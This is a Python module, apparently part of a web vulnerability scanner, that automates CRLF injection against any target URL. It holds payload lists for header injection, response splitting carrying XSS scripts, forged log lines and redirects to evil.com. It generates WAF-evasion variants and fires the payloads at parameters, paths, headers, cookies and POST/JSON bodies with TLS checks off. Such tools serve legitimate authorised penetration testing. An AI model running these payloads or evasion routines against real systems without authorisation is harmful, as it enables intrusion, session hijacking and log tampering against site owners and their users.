"""CRLF injection — inject HTTP headers via \\r\\n in parameters, response splitting, log forgery."""

import httpx
import urllib.parse
import re
import asyncio
import random
import string


CRLF_PAYLOADS = [
    ("standard_crlf", "%0d%0a"),
    ("uppercase_crlf", "%0D%0A"),
    ("lf_only", "%0a"),
    ("cr_only", "%0d"),
    ("literal_crlf", "\r\n"),
    ("double_encoded", "%250d%250a"),
    ("triple_encoded", "%25250d%25250a"),
    ("unicode_crlf", "%e0%80%8a"),
    ("overlong_utf8", "%c0%8a"),
    ("utf8_lf", "%c0%8a"),
    ("mixed_case", "%0d%0A"),
    ("mixed_case2", "%0D%0a"),
    ("tab_before_cr", "%09%0d%0a"),
    ("space_before_cr", "%20%0d%0a"),
    ("null_byte", "%00%0d%0a"),
    ("backslash_r", "\\r\\n"),
    ("double_slash_r", "\\\\r\\\\n"),
    ("html_encoded", "&#13;&#10;"),
    ("html_entity_cr", "&#x0D;"),
    ("html_entity_lf", "&#x0A;"),
    ("double_encoded_lf", "%250a"),
    ("double_encoded_cr", "%250d"),
    ("quadruple_encoded", "%25250d%25250a"),
    ("utf16_crlf", "%00%0d%00%0a"),
    ("utf16_le_crlf", "%0d%00%0a%00"),
    ("newline_variants", "%0d%0d%0a"),
    ("multi_crlf", "%0d%0a%0d%0a"),
    ("crlf_with_space", "%0d%0a%20"),
    ("crlf_with_tab", "%0d%0a%09"),
    ("backspace_crlf", "%08%0d%0a"),
    ("form_feed_crlf", "%0c%0d%0a"),
    ("vertical_tab_crlf", "%0b%0d%0a"),
]

HEADER_INJECTION_PAYLOADS = [
    ("set_cookie", "X-Injected: injected_value%0d%0aSet-Cookie: injected=true"),
    ("set_cookie_path", "Referer: %0d%0aSet-Cookie: path=/;injected=true"),
    ("x_forwarded", "X-Forwarded-For: 127.0.0.1%0d%0aX-Injected: true"),
    ("location_inject", "Location: http://evil.com%0d%0aX-Injected: true"),
    ("content_type", "Content-Type: text/html%0d%0aX-Injected: true"),
    ("cache_control", "Cache-Control: no-cache%0d%0aX-Injected: true"),
    ("pragma_inject", "Pragma: no-cache%0d%0aX-Injected: true"),
    ("www_auth", "WWW-Authenticate: Basic%0d%0aX-Injected: true"),
    ("proxy_auth", "Proxy-Authenticate: Basic%0d%0aX-Injected: true"),
    ("transfer_encoding", "Transfer-Encoding: chunked%0d%0aX-Injected: true"),
    ("content_length", "Content-Length: 0%0d%0aX-Injected: true"),
    ("host_inject", "Host: evil.com%0d%0aX-Injected: true"),
    ("connection_inject", "Connection: close%0d%0aX-Injected: true"),
    ("keep_alive", "Keep-Alive: timeout=5%0d%0aX-Injected: true"),
    ("server_inject", "Server: injected%0d%0aX-Injected: true"),
    ("x_powered", "X-Powered-By: injected%0d%0aX-Injected: true"),
]

RESPONSE_SPLITTING_PAYLOADS = [
    ("html_inject", "%0d%0a%0d%0a<script>alert(1)</script>"),
    ("img_inject", "%0d%0a%0d%0a<img src=x onerror=alert(1)>"),
    ("svg_inject", "%0d%0a%0d%0a<svg/onload=alert(1)>"),
    ("body_inject", "%0d%0a%0d%0a<body onload=alert(1)>"),
    ("iframe_inject", "%0d%0a%0d%0a<iframe src=javascript:alert(1)>"),
    ("event_handler", "%0d%0a%0d%0a<div onmouseover=alert(1)>"),
    ("javascript_uri", "%0d%0a%0d%0a<a href=javascript:alert(1)>click</a>"),
    ("data_uri", "%0d%0a%0d%0a<a href=data:text/html,<script>alert(1)</script>>click</a>"),
    ("meta_refresh", "%0d%0a%0d%0a<meta http-equiv=refresh content=0;url=javascript:alert(1)>"),
    ("base_tag", "%0d%0a%0d%0a<base href=javascript://>"),
    ("style_expression", "%0d%0a%0d%0a<div style=expression(alert(1))>"),
    ("xss_handler", "%0d%0a%0d%0a<details open ontoggle=alert(1)>"),
    ("video_xss", "%0d%0a%0d%0a<video src=x onerror=alert(1)>"),
    ("audio_xss", "%0d%0a%0d%0a<audio src=x onerror=alert(1)>"),
    ("object_xss", "%0d%0a%0d%0a<object data=javascript:alert(1)>"),
    ("embed_xss", "%0d%0a%0d%0a<embed src=javascript:alert(1)>"),
    ("applet_xss", "%0d%0a%0d%0a<applet code=alert(1)>"),
    ("form_action", "%0d%0a%0d%0a<form action=javascript:alert(1)><input type=submit>"),
]

LOG_INJECTION_PAYLOADS = [
    ("newline_log", "admin%0d%0a[FAKE] Login successful for admin"),
    ("cr_log", "user%0d[FAKE] Password changed"),
    ("lf_log", "test%0a[FAKE] Access granted"),
    ("crlf_log", "victim%0d%0a[ADMIN] Privilege escalation"),
    ("null_log", "admin%00%0d%0a[FAKE] Auth bypass"),
    ("tab_log", "user%09%0d%0a[FAKE] Token refreshed"),
    ("ansi_escape", "user%1b[31m[FAKE]%1b[0m"),
    ("null_byte_log", "admin%00admin%0d%0a[FAKE]"),
    ("unicode_log", "admin%e2%80%a8%0d%0a[FAKE]"),
    ("backspace_log", "admin%08%0d%0a[FAKE]"),
    ("form_feed_log", "user%0c%0d%0a[FAKE]"),
    ("vertical_tab_log", "user%0b%0d%0a[FAKE]"),
    ("bell_char", "user%07%0d%0a[FAKE]"),
    ("escape_char", "user%1b%0d%0a[FAKE]"),
]

REDIRECT_INJECTION_PAYLOADS = [
    ("redirect_crlf", "http://evil.com%0d%0aX-Injected: true"),
    ("redirect_cookie", "http://evil.com%0d%0aSet-Cookie: evil=true"),
    ("redirect_xss", "http://evil.com%0d%0a%0d%0a<script>alert(1)</script>"),
    ("redirect_html", "http://evil.com%0d%0a%0d%0a<h1>Injected</h1>"),
    ("redirect_meta", "http://evil.com%0d%0a%0d%0a<meta http-equiv=refresh content=0;url=javascript:alert(1)>"),
    ("redirect_base", "http://evil.com%0d%0a%0d%0a<base href=javascript://>"),
    ("redirect_double", "http://evil.com%0d%0aLocation: http://second-evil.com"),
    ("redirect_split", "http://evil.com%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0aInjected"),
]

TARGET_PARAMS = [
    "q", "search", "query", "input", "name", "user", "email", "url",
    "redirect", "next", "return", "goto", "callback", "ref", "page",
    "lang", "file", "path", "dir", "template", "view", "action",
]

INJECTION_POINTS = [
    "url_params", "path_segments", "headers", "cookies",
    "post_body", "form_data", "json_body",
]


def _detect_header_injection(resp_body: str, resp_headers: dict) -> list[dict]:
    """Detect injected headers in response body or headers."""
    findings = []
    indicators = [
        "x-injected", "x-forwarded-for", "set-cookie",
        "location", "content-type", "cache-control",
        "www-authenticate", "proxy-authenticate",
    ]
    for header in indicators:
        if header in resp_body.lower():
            findings.append({
                "type": "header_in_reflection",
                "header": header,
                "evidence": resp_body[max(0, resp_body.lower().find(header) - 40):resp_body.lower().find(header) + 80],
            })
    for header, value in resp_headers.items():
        if "injected" in value.lower():
            findings.append({
                "type": "injected_header_detected",
                "header": header,
                "value": value,
            })
    return findings


def _detect_response_splitting(body: str) -> list[dict]:
    """Detect response splitting indicators."""
    findings = []
    patterns = [
        (r"<script[^>]*>", "script_tag"),
        (r"<img[^>]*onerror", "img_xss"),
        (r"<svg[^>]*onload", "svg_xss"),
        (r"<body[^>]*onload", "body_xss"),
        (r"javascript:", "javascript_uri"),
        (r"data:text/html", "data_uri"),
        (r"<iframe[^>]*>", "iframe_injection"),
        (r"alert\s*\(", "alert_function"),
        (r"document\.cookie", "cookie_theft"),
        (r"document\.write", "document_write"),
        (r"<details[^>]*open", "details_xss"),
    ]
    for pattern, name in patterns:
        if re.search(pattern, body, re.IGNORECASE):
            findings.append({
                "type": "response_splitting",
                "indicator": name,
                "pattern": pattern,
            })
    return findings


def _detect_log_injection(body: str) -> list[dict]:
    """Detect log injection indicators in response."""
    findings = []
    log_patterns = [
        (r"\[FAKE\]", "fake_log_entry"),
        (r"\[ADMIN\]", "admin_log_entry"),
        (r"Login successful for", "fake_login"),
        (r"Access granted", "fake_access"),
        (r"Password changed", "fake_password_change"),
        (r"Privilege escalation", "fake_privesc"),
    ]
    for pattern, name in log_patterns:
        if re.search(pattern, body, re.IGNORECASE):
            findings.append({
                "type": "log_injection",
                "indicator": name,
                "pattern": pattern,
            })
    return findings


def _detect_waf(body: str, status: int, headers: dict) -> bool:
    """Detect WAF presence."""
    waf_indicators = [
        "access denied", "forbidden", "blocked", "waf",
        "security", " protection", "cloudflare", "akamai",
        "incapsula", "imperva", "sucuri", "mod_security",
    ]
    if status in (403, 406, 429, 503):
        return True
    lower = body.lower()
    return any(ind in lower for ind in waf_indicators)


def _get_waf_bypass_variants(payload: str) -> list[tuple[str, str]]:
    """Generate WAF bypass variants for a payload."""
    variants = []
    variants.append(("original", payload))

    if "%" in payload:
        double = payload.replace("%", "%25")
        variants.append(("double_encoded", double))

    if "%0d" in payload.lower():
        variants.append(("mixed_case_cr", payload.lower().replace("%0d", "%0D")))
        variants.append(("uppercase_cr", payload.replace("%0d", "%0D").replace("%0a", "%0A")))

    if "%0a" in payload.lower():
        variants.append(("uppercase_lf", payload.replace("%0a", "%0A")))

    if "\\r\\n" in payload:
        variants.append(("literal_crlf", payload.replace("\\r\\n", "\r\n")))

    null_variants = [
        ("null_before_cr", payload.replace("%0d", "%00%0d")),
        ("null_between", payload.replace("%0d", "%0d%00")),
    ]
    variants.extend(null_variants)

    tab_variants = [
        ("tab_separated", payload.replace("%0d", "%09%0d")),
        ("space_separated", payload.replace("%0d", "%20%0d")),
    ]
    variants.extend(tab_variants)

    if len(variants) > 6:
        variants = variants[:6]
    return variants


async def crlf_inject(target: str) -> dict:
    """CRLF injection testing — header injection, response splitting, log forgery, redirect injection, WAF bypass."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path or "/"
    results = []

    async with httpx.AsyncClient(timeout=12.0, verify=False, follow_redirects=False) as client:
        # Get baseline response
        baseline = None
        try:
            resp = await client.get(target)
            baseline = {
                "status": resp.status_code,
                "size": len(resp.text),
                "body": resp.text,
                "headers": dict(resp.headers),
            }
        except Exception:
            baseline = {"status": 0, "size": 0, "body": "", "headers": {}}

        # --- Test 1: CRLF in URL parameters ---
        for param in TARGET_PARAMS:
            for payload_name, payload in CRLF_PAYLOADS[:20]:
                for variant_name, variant_payload in _get_waf_bypass_variants(payload)[:3]:
                    try:
                        url = f"{base}{path}?{urllib.parse.urlencode({param: variant_payload})}"
                        resp = await client.get(url)
                        body = resp.text
                        headers = dict(resp.headers)

                        if _detect_waf(body, resp.status_code, headers):
                            continue

                        injected_headers = _detect_header_injection(body, headers)
                        split_indicators = _detect_response_splitting(body)

                        if injected_headers or split_indicators:
                            risk = "CRITICAL" if split_indicators else "HIGH"
                            results.append({
                                "technique": "header_injection",
                                "param": param,
                                "payload": payload_name,
                                "variant": variant_name,
                                "injected_headers": injected_headers,
                                "split_indicators": split_indicators,
                                "status": resp.status_code,
                                "evidence": (injected_headers[0] if injected_headers else split_indicators[0]),
                                "risk": risk,
                                "confidence": "high",
                            })
                            break

                    except Exception:
                        continue

        # --- Test 2: CRLF in path segments ---
        for payload_name, payload in CRLF_PAYLOADS[:15]:
            for variant_name, variant_payload in _get_waf_bypass_variants(payload)[:2]:
                try:
                    encoded_path = urllib.parse.quote(variant_payload)
                    url = f"{base}{path}{encoded_path}"
                    resp = await client.get(url)
                    body = resp.text
                    headers = dict(resp.headers)

                    if _detect_waf(body, resp.status_code, headers):
                        continue

                    split_indicators = _detect_response_splitting(body)
                    injected_headers = _detect_header_injection(body, headers)

                    if split_indicators or injected_headers:
                        risk = "CRITICAL" if split_indicators else "HIGH"
                        results.append({
                            "technique": "path_crlf",
                            "payload": payload_name,
                            "variant": variant_name,
                            "split_indicators": split_indicators,
                            "injected_headers": injected_headers,
                            "status": resp.status_code,
                            "evidence": split_indicators[0] if split_indicators else injected_headers[0],
                            "risk": risk,
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 3: Header injection via manipulable headers ---
        header_targets = [
            ("Referer", [p for _, p in HEADER_INJECTION_PAYLOADS]),
            ("User-Agent", [p for _, p in HEADER_INJECTION_PAYLOADS[:8]]),
            ("X-Forwarded-For", [p for _, p in HEADER_INJECTION_PAYLOADS[:5]]),
            ("Cookie", ["session=%0d%0aX-Injected:true", "token=%0d%0aSet-Cookie:evil=true"]),
            ("Accept-Language", [p for _, p in HEADER_INJECTION_PAYLOADS[:5]]),
            ("X-Forwarded-Host", [p for _, p in HEADER_INJECTION_PAYLOADS[:5]]),
        ]
        for header_name, payloads in header_targets:
            for payload in payloads:
                try:
                    headers = {header_name: payload}
                    resp = await client.get(target, headers=headers)
                    body = resp.text
                    resp_headers = dict(resp.headers)

                    if _detect_waf(body, resp.status_code, resp_headers):
                        continue

                    injected = _detect_header_injection(body, resp_headers)
                    if injected:
                        results.append({
                            "technique": "header_injection_via_header",
                            "injection_header": header_name,
                            "payload": payload[:100],
                            "injected_headers": injected,
                            "status": resp.status_code,
                            "evidence": injected[0],
                            "risk": "HIGH",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 4: Response splitting ---
        for payload_name, payload in RESPONSE_SPLITTING_PAYLOADS:
            for param in TARGET_PARAMS[:5]:
                try:
                    url = f"{base}{path}?{urllib.parse.urlencode({param: payload})}"
                    resp = await client.get(url)
                    body = resp.text
                    resp_headers = dict(resp.headers)

                    if _detect_waf(body, resp.status_code, resp_headers):
                        continue

                    split = _detect_response_splitting(body)
                    if split:
                        results.append({
                            "technique": "response_splitting",
                            "param": param,
                            "payload": payload_name,
                            "indicators": split,
                            "status": resp.status_code,
                            "evidence": split[0],
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 5: Log injection ---
        for payload_name, payload in LOG_INJECTION_PAYLOADS:
            for param in TARGET_PARAMS[:5]:
                try:
                    url = f"{base}{path}?{urllib.parse.urlencode({param: payload})}"
                    resp = await client.get(url)
                    body = resp.text

                    log_inj = _detect_log_injection(body)
                    if log_inj:
                        results.append({
                            "technique": "log_injection",
                            "param": param,
                            "payload": payload_name,
                            "indicators": log_inj,
                            "status": resp.status_code,
                            "evidence": log_inj[0],
                            "risk": "MEDIUM",
                            "confidence": "medium",
                        })
                        break
                except Exception:
                    continue

        # --- Test 6: Redirect injection ---
        redirect_params = ["redirect", "next", "return", "goto", "callback", "url", "dest"]
        for param in redirect_params:
            for payload_name, payload in REDIRECT_INJECTION_PAYLOADS:
                try:
                    url = f"{base}{path}?{urllib.parse.urlencode({param: payload})}"
                    resp = await client.get(url)
                    body = resp.text
                    location = resp.headers.get("location", "")

                    if _detect_waf(body, resp.status_code, dict(resp.headers)):
                        continue

                    if "%0d" in location.lower() or "%0a" in location.lower():
                        results.append({
                            "technique": "redirect_crlf",
                            "param": param,
                            "payload": payload_name,
                            "location_header": location[:200],
                            "status": resp.status_code,
                            "evidence": f"Location: {location[:200]}",
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break

                    split = _detect_response_splitting(body)
                    if split:
                        results.append({
                            "technique": "redirect_response_splitting",
                            "param": param,
                            "payload": payload_name,
                            "indicators": split,
                            "status": resp.status_code,
                            "evidence": split[0],
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 7: POST body injection ---
        post_params = ["q", "search", "name", "email", "message", "comment", "input"]
        for param in post_params:
            for payload_name, payload in CRLF_PAYLOADS[:10]:
                try:
                    data = {param: payload}
                    resp = await client.post(target, data=data)
                    body = resp.text
                    resp_headers = dict(resp.headers)

                    if _detect_waf(body, resp.status_code, resp_headers):
                        continue

                    split = _detect_response_splitting(body)
                    injected = _detect_header_injection(body, resp_headers)

                    if split or injected:
                        risk = "CRITICAL" if split else "HIGH"
                        results.append({
                            "technique": "post_body_crlf",
                            "param": param,
                            "payload": payload_name,
                            "split_indicators": split,
                            "injected_headers": injected,
                            "status": resp.status_code,
                            "evidence": split[0] if split else injected[0],
                            "risk": risk,
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 8: Cookie value injection ---
        cookie_payloads = [
            ("crlf_cookie", "session_id%0d%0aX-Injected:true"),
            ("crlf_set_cookie", "value%0d%0aSet-Cookie:evil=true"),
            ("crlf_html", "val%0d%0a%0d%0a<script>alert(1)</script>"),
        ]
        for payload_name, payload in cookie_payloads:
            try:
                cookies = {"session": payload}
                resp = await client.get(target, cookies=cookies)
                body = resp.text
                resp_headers = dict(resp.headers)

                if _detect_waf(body, resp.status_code, resp_headers):
                    continue

                split = _detect_response_splitting(body)
                injected = _detect_header_injection(body, resp_headers)

                if split or injected:
                    risk = "CRITICAL" if split else "HIGH"
                    results.append({
                        "technique": "cookie_crlf",
                        "payload": payload_name,
                        "split_indicators": split,
                        "injected_headers": injected,
                        "status": resp.status_code,
                        "evidence": split[0] if split else injected[0],
                        "risk": risk,
                        "confidence": "high",
                    })
            except Exception:
                continue

        # --- Test 9: JSON body injection ---
        json_payloads = [
            ("crlf_json", {"q": "test%0d%0aX-Injected:true"}),
            ("crlf_json_split", {"q": "test%0d%0a%0d%0a<script>alert(1)</script>"}),
            ("crlf_json_cookie", {"q": "val%0d%0aSet-Cookie:evil=true"}),
        ]
        for payload_name, data in json_payloads:
            try:
                headers = {"Content-Type": "application/json"}
                resp = await client.post(target, json=data, headers=headers)
                body = resp.text
                resp_headers = dict(resp.headers)

                if _detect_waf(body, resp.status_code, resp_headers):
                    continue

                split = _detect_response_splitting(body)
                injected = _detect_header_injection(body, resp_headers)

                if split or injected:
                    risk = "CRITICAL" if split else "HIGH"
                    results.append({
                        "technique": "json_body_crlf",
                        "payload": payload_name,
                        "split_indicators": split,
                        "injected_headers": injected,
                        "status": resp.status_code,
                        "evidence": split[0] if split else injected[0],
                        "risk": risk,
                        "confidence": "high",
                    })
            except Exception:
                continue

    return {
        "target": target,
        "results": results,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
